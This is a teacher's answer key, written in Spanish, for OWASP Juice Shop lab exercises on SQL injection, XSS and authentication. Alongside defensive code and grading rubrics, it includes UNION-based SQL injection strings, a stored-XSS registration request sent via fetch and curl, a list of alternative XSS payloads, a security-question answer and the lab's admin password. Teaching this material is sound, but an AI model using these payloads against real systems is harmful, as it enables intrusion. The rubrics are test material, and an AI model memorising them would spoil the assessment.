# Soluciones para el profesor — Práctica Integradora Juice Shop

> **CONFIDENCIAL** — Este documento contiene las soluciones completas de todos los ejercicios. No compartir con los alumnos.

---

## 2. Inyección SQL (SQLi)

### Ejercicio 1: Desafío "Christmas Special"

**Objetivo:** Encontrar un producto navideño oculto (soft-deleted) y agregarlo al carrito.

**Paso 1 — Descubrir el producto oculto:**

En la barra de búsqueda de Juice Shop, inyectar:

```
')) UNION SELECT id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt FROM Products WHERE deletedAt IS NOT NULL--
```

Esto devuelve los productos eliminados. El producto navideño es **"Christmas Super-Surprise-Box (2014 Edition)"** con `id = 10` (puede variar según la versión).

**Alternativa más simple** — buscar directamente:

```
christmas'))--
```

Esto cierra la consulta original y comenta el filtro `deletedAt IS NULL` que normalmente oculta los productos eliminados.

**Paso 2 — Agregar al carrito vía API:**

El carrito no permite agregar productos eliminados desde la UI, pero sí desde la API:

```javascript
// Desde la consola del navegador, estando logueado:
fetch("/api/BasketItems", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + localStorage.getItem("token")
  },
  body: JSON.stringify({
    ProductId: 10,
    BasketId: "1",   // el BasketId del usuario actual (ver en /rest/basket/1)
    quantity: 1
  })
});
```

**Criterio de corrección:**
- 40% — Encontrar el producto oculto con SQLi
- 30% — Identificar el ID del producto
- 30% — Agregarlo al carrito exitosamente (aparece en el scoreboard)

---

### Ejercicio 2: Endpoint de búsqueda seguro

**Solución esperada:**

```typescript
import express from "express";
import { Op } from "sequelize";
import { Product } from "./models/product";

const router = express.Router();

router.get("/api/products/search", async (req, res) => {
  const term = req.query.q;

  if (typeof term !== "string") {
    return res.status(400).json({ error: "Parámetro q requerido" });
  }

  const products = await Product.findAll({
    where: {
      name: { [Op.like]: `%${term}%` },
      deletedAt: null,
    },
    limit: 50,
    attributes: ["id", "name", "description", "price", "image"],
  });

  res.json(products);
});

export default router;
```

**Puntos clave que deben estar:**

| Requisito | Qué buscar en la solución del alumno |
|-----------|--------------------------------------|
| Consultas parametrizadas | Usa métodos del ORM (`findAll`, `where`) o `replacements`. NO concatena strings en SQL. |
| Límite de 50 | Tiene `limit: 50` o equivalente |
| Solo productos no eliminados | Filtra `deletedAt: null` o usa `paranoid: true` en el modelo |
| Validación de input | Verifica que `q` exista y sea string |

**Errores comunes a detectar:**
- Usar `sequelize.query()` con template literals — es la misma vulnerabilidad que estamos enseñando
- Olvidar el filtro de `deletedAt`
- No poner límite de resultados

---

### Ejercicio 3: Análisis del código fuente

**Respuesta esperada:**

El archivo vulnerable en Juice Shop es `routes/search.ts` (o `routes/search.js` en el build). La línea vulnerable es similar a:

```typescript
// Dentro de routes/search.ts
const criteria = req.query.q === 'undefined' ? '' : req.query.q ?? ''
models.sequelize.query(
  `SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`
)
```

**Por qué es vulnerable:** El valor de `criteria` proviene directamente de `req.query.q` (input del usuario) y se concatena en el string SQL con template literals. No hay sanitización ni parametrización.

**Cómo corregirlo:**

```typescript
models.sequelize.query(
  `SELECT * FROM Products WHERE ((name LIKE :term OR description LIKE :term) AND deletedAt IS NULL) ORDER BY name`,
  {
    replacements: { term: `%${criteria}%` },
    type: QueryTypes.SELECT,
  }
)
```

O mejor aún, usar el ORM:

```typescript
const products = await Product.findAll({
  where: {
    [Op.or]: [
      { name: { [Op.like]: `%${criteria}%` } },
      { description: { [Op.like]: `%${criteria}%` } },
    ],
  },
  paranoid: true, // respeta deletedAt automáticamente
});
```

**Criterio de corrección:**
- 30% — Identifica el archivo y la línea correcta
- 40% — Explica correctamente por qué la concatenación es vulnerable
- 30% — Propone una corrección funcional con parámetros

---

## 3. Cross-Site Scripting (XSS)

### Ejercicio 1: Desafío "Client-side XSS Protection"

**Contexto:** El formulario de registro tiene validación client-side que impide caracteres HTML en el email. Pero la validación solo está en el frontend (Angular), no en el backend.

**Solución — Bypass por API directa:**

```javascript
// Desde la consola del navegador o con curl:
fetch("/api/Users/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    email: "<iframe src=\"javascript:alert('xss')\">@juice-sh.op",
    password: "password123",
    passwordRepeat: "password123",
    securityQuestion: {
      id: 1,
      question: "Your eldest siblings middle name?"
    },
    securityAnswer: "test"
  })
});
```

**¿Qué pasa después?** El email con el payload XSS se guarda en la base de datos. Cuando un administrador ve la lista de usuarios en el panel de administración (`/#/administration`), el email se renderiza con `innerHTML` y ejecuta el JavaScript.

**Con curl:**

```bash
curl -X POST http://localhost:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{
    "email": "<iframe src=\"javascript:alert(xss)\">@juice-sh.op",
    "password": "password123",
    "passwordRepeat": "password123",
    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
    "securityAnswer": "test"
  }'
```

**Criterio de corrección:**
- 30% — Identifica que la validación es solo client-side
- 40% — Logra enviar el request directamente a la API (fetch o curl)
- 30% — El desafío aparece como completado en el scoreboard

---

### Ejercicio 2: Middleware de seguridad HTTP

**Solución esperada:**

```typescript
import { Request, Response, NextFunction } from "express";

function securityHeaders(req: Request, res: Response, next: NextFunction) {
  // Content Security Policy — bloquea scripts inline y frames
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-src 'none'; frame-ancestors 'none'"
  );

  // Evita que el navegador adivine el Content-Type (previene sniffing)
  res.setHeader("X-Content-Type-Options", "nosniff");

  // Impide que la página se cargue en un iframe (anti-clickjacking)
  res.setHeader("X-Frame-Options", "DENY");

  next();
}

export default securityHeaders;

// Uso:
// app.use(securityHeaders);
```

**Alternativa con helmet (también válida):**

```typescript
import helmet from "helmet";

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
      frameSrc: ["'none'"],
      frameAncestors: ["'none'"],
    },
  },
  xContentTypeOptions: true,
  frameguard: { action: "deny" },
}));
```

**Criterio de corrección:**

| Header | Qué verificar | Puntos |
|--------|---------------|--------|
| `Content-Security-Policy` | Incluye `script-src` sin `'unsafe-inline'` y `frame-src 'none'` | 40% |
| `X-Content-Type-Options` | Valor es `nosniff` | 20% |
| `X-Frame-Options` | Valor es `DENY` (o `SAMEORIGIN` — aceptable) | 20% |
| Estructura | Es un middleware válido con `(req, res, next)` | 20% |

**Errores comunes:**
- Poner `'unsafe-inline'` en `script-src` — esto anula la protección contra XSS inline
- Olvidar llamar a `next()`
- Poner los headers después de `res.send()` (no tienen efecto)

---

### Ejercicio 3: Análisis de innerHTML en Juice Shop

**Respuesta esperada:**

En el frontend de Juice Shop (código Angular), el componente de búsqueda usa `[innerHTML]` para mostrar el término de búsqueda. Se puede encontrar en:

**Archivo:** `frontend/src/app/search-result/search-result.component.html`

La línea relevante es similar a:

```html
<div [innerHTML]="'Search Results - ' + searchValue"></div>
```

**Por qué es peligroso:**

`[innerHTML]` en Angular bypasea el mecanismo de sanitización por defecto. Cuando Angular usa interpolación `{{ }}`, automáticamente escapa caracteres HTML (`<`, `>`, `"`, etc.). Pero `[innerHTML]` inserta el contenido como HTML real, permitiendo que tags como `<iframe>`, `<img onerror=...>`, `<svg onload=...>` se interpreten y ejecuten código.

**Alternativa segura:**

```html
<!-- Opción 1: interpolación (escapa automáticamente) -->
<div>Search Results - {{ searchValue }}</div>

<!-- Opción 2: si se necesita HTML, sanitizar explícitamente en el componente -->
<div [innerHTML]="sanitizedSearchValue"></div>
```

```typescript
// En el componente:
import { DomSanitizer, SecurityContext } from "@angular/platform-browser";

this.sanitizedSearchValue = this.sanitizer.sanitize(
  SecurityContext.HTML,
  "Search Results - " + this.searchValue
) ?? "";
```

**Criterio de corrección:**
- 30% — Encuentra el uso de `[innerHTML]` (puede ser con DevTools > Sources)
- 40% — Explica correctamente la diferencia entre `[innerHTML]` e interpolación `{{ }}`
- 30% — Propone alternativa segura (interpolación o DomSanitizer)

---

## 4. Fuerza Bruta y Autenticación

### Ejercicio 1: Desafío "Reset Morty's Password"

**Contexto:** El personaje Morty Smith (de Rick and Morty) tiene una cuenta en Juice Shop. La pregunta de seguridad es sobre su mascota.

**Paso 1 — Encontrar el email de Morty:**

Ir a la página de "Forgot Password" (`/#/forgot-password`). Probar emails comunes:
- `morty@juice-sh.op` — este es el correcto

**Paso 2 — Ver la pregunta de seguridad:**

Al ingresar el email, aparece la pregunta: **"What is the name of your favorite pet?"**

**Paso 3 — Responder:**

En la serie Rick and Morty, Morty tiene un perro llamado **Snuffles** (que luego se renombra "Snowball"). La respuesta es:

```
Snuffles
```

**Paso 4 — Resetear la contraseña:**

Ingresar "Snuffles" como respuesta, poner una nueva contraseña y confirmar. El desafío se completa.

**Nota para el profesor:** Si un alumno responde "Snowball" y no funciona, la respuesta correcta en Juice Shop es "Snuffles" (el nombre original del perro, antes de que se vuelva inteligente).

**Criterio de corrección:**
- 20% — Encuentra el email de Morty
- 30% — Identifica que la pregunta es sobre mascotas y busca en información pública del personaje
- 30% — Logra resetear la contraseña
- 20% — Reflexiona sobre por qué las preguntas de seguridad son inseguras (las respuestas son información pública o adivinable)

---

### Ejercicio 2: Módulo completo de autenticación

**Solución esperada:**

```typescript
// auth.ts — Módulo de autenticación completo
import express from "express";
import bcrypt from "bcrypt";
import rateLimit from "express-rate-limit";
import { User } from "./models/user";

const router = express.Router();
const SALT_ROUNDS = 12;

// --- Rate Limiting ---
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: "Demasiados intentos. Intentá de nuevo en 15 minutos." },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => req.body.email || req.ip,
});

// --- Validación de contraseña ---
function validatePassword(password: string): string[] {
  const errors: string[] = [];
  if (password.length < 10) errors.push("Mínimo 10 caracteres");
  if (!/[A-Z]/.test(password)) errors.push("Al menos una mayúscula");
  if (!/[a-z]/.test(password)) errors.push("Al menos una minúscula");
  if (!/[0-9]/.test(password)) errors.push("Al menos un número");
  if (!/[^A-Za-z0-9]/.test(password)) errors.push("Al menos un carácter especial");
  return errors;
}

// --- Registro ---
router.post("/api/register", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email y contraseña requeridos" });
  }

  // Validar formato de email
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return res.status(400).json({ error: "Formato de email inválido" });
  }

  // Validar complejidad de contraseña
  const passwordErrors = validatePassword(password);
  if (passwordErrors.length > 0) {
    return res.status(400).json({ error: "Contraseña débil", details: passwordErrors });
  }

  // Verificar si el email ya existe
  const existing = await User.findOne({ where: { email } });
  if (existing) {
    // Respuesta genérica para no revelar qué emails están registrados
    return res.status(409).json({ error: "No se pudo crear la cuenta" });
  }

  // Hashear y guardar
  const hash = await bcrypt.hash(password, SALT_ROUNDS);
  await User.create({ email, password: hash });

  res.status(201).json({ message: "Cuenta creada exitosamente" });
});

// --- Login ---
router.post("/api/login", loginLimiter, async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Credenciales inválidas" });
  }

  const user = await User.findOne({ where: { email } });

  if (!user) {
    // IMPORTANTE: no decir "email no encontrado"
    return res.status(401).json({ error: "Credenciales inválidas" });
  }

  const match = await bcrypt.compare(password, user.password);

  if (!match) {
    // IMPORTANTE: misma respuesta que si el email no existe
    return res.status(401).json({ error: "Credenciales inválidas" });
  }

  // Login exitoso — aquí iría la generación de JWT/sesión
  res.json({ message: "Login exitoso", userId: user.id });
});

export default router;
```

**Rúbrica de corrección:**

| Requisito | Puntos | Qué verificar |
|-----------|--------|---------------|
| Validación de complejidad | 20% | Verifica largo, mayúsculas, minúsculas, números, especiales |
| Rate limiting | 25% | Usa express-rate-limit (o equivalente) con máx 5 intentos en 15 min, keyed por email |
| bcrypt con 12+ rounds | 25% | Usa `bcrypt.hash` con saltRounds >= 12, `bcrypt.compare` para verificar |
| Respuestas genéricas | 20% | El mismo mensaje de error para email inexistente y password incorrecto |
| Estructura general | 10% | Compila, tiene tipos TypeScript, endpoints correctos |

**Errores graves (restar puntos):**
- Guardar la contraseña en texto plano o con MD5/SHA
- Revelar si el email existe o no en el mensaje de error
- No tener rate limiting en el login
- Usar `==` para comparar passwords en vez de `bcrypt.compare`

---

### Ejercicio 3: Análisis escrito

**Respuesta modelo:**

**¿Por qué la longitud mínima importa más que la complejidad?**

La entropía de una contraseña depende principalmente de su longitud. Una contraseña de 8 caracteres con mayúsculas, minúsculas, números y símbolos tiene ~52 bits de entropía. Pero una passphrase de 4 palabras aleatorias como "correct horse battery staple" tiene ~44 bits y es mucho más fácil de recordar, mientras que una de 5 palabras sube a ~55 bits. Forzar complejidad (Abc123!@) lleva a los usuarios a patrones predecibles ("P@ssw0rd1!"), mientras que exigir longitud mínima de 12-14 caracteres incentiva passphrases que son simultáneamente más fuertes y más memorables. NIST SP 800-63B (2017) recomienda exactamente esto: longitud mínima alta, sin reglas de complejidad obligatorias.

**¿Qué diferencia hace bcrypt vs MD5/SHA?**

MD5 y SHA son funciones de hash rápidas, diseñadas para velocidad. Una GPU moderna puede calcular ~10 mil millones de hashes MD5 por segundo. Eso significa que una contraseña de 8 caracteres alfanuméricos (~41 bits) se crackea en minutos.

bcrypt es deliberadamente lento: con 12 rounds, cada hash tarda ~250ms en una CPU. Esto reduce la velocidad de ataque a ~4 intentos por segundo por core. La misma contraseña de 8 caracteres que se crackea en minutos con MD5, tardaría siglos con bcrypt. Además, bcrypt incluye un salt automático, previniendo ataques con rainbow tables.

**¿Cómo el rate limiting neutraliza el script de fuerza bruta?**

El script del Problema 1 envía requests secuenciales al endpoint de login sin pausa. Sin rate limiting, puede probar cientos de contraseñas por segundo. Con `express-rate-limit` configurado a 5 intentos cada 15 minutos por email:

- El script solo prueba 5 contraseñas antes de recibir HTTP 429 (Too Many Requests)
- Tiene que esperar 15 minutos para los siguientes 5 intentos
- Probar las 15 contraseñas del script tomaría 45 minutos en vez de <1 segundo
- Una lista real de 10.000 contraseñas tardaría ~20 días

Combinado con bloqueo progresivo (cada bloqueo duplica el tiempo de espera), el ataque se vuelve impráctico.

**Criterio de corrección:**

| Pregunta | Puntos | Qué buscar |
|----------|--------|------------|
| Longitud vs complejidad | 33% | Menciona entropía o espacio de búsqueda. Explica que la complejidad lleva a patrones predecibles. Bonus si cita NIST. |
| bcrypt vs MD5/SHA | 33% | Diferencia velocidad de hash. Menciona órdenes de magnitud. Menciona salt. |
| Rate limiting | 33% | Calcula o estima cuánto tarda el ataque con y sin limiting. Explica el HTTP 429. |

---

## Criterios generales de evaluación

| Componente | Peso | Descripción |
|------------|------|-------------|
| Desafíos completados (scoreboard) | 30% | Capturas del scoreboard mostrando los desafíos resueltos |
| Código defensivo | 40% | Funciona, compila, implementa las defensas correctas |
| Análisis escrito | 20% | Demuestra comprensión del porqué, no solo del cómo |
| Documentación | 10% | Capturas, pasos documentados, código comentado donde sea necesario |

### Notas para la corrección

1. **SQLi en la búsqueda:** El número de columnas del UNION puede variar según la versión de Juice Shop (8 o 9). Si el alumno tiene un número distinto pero funciona, es correcto.

2. **XSS payloads alternativos:** Además de `<iframe src="javascript:...">`, son válidos:
   - `<img src=x onerror="alert('xss')">`
   - `<svg onload="alert('xss')">`
   - `<body onload="alert('xss')">`
   - Cualquier payload que ejecute JS y sea aceptado por `innerHTML`

3. **Contraseña del admin:** Es `admin123`. Si un alumno la encuentra manualmente (adivinando) sin el script, es igualmente válido — el punto es demostrar que las contraseñas débiles son vulnerables.

4. **Versión de Juice Shop:** Las soluciones están basadas en Juice Shop v15+. Si los alumnos usan otra versión, algunos detalles pueden variar (IDs de productos, endpoints exactos).

5. **Si un alumno usa herramientas externas** (Burp Suite, OWASP ZAP, sqlmap) para resolver los desafíos, es aceptable siempre que documente lo que hizo y entienda el principio. El objetivo es aprender, no restringir herramientas.
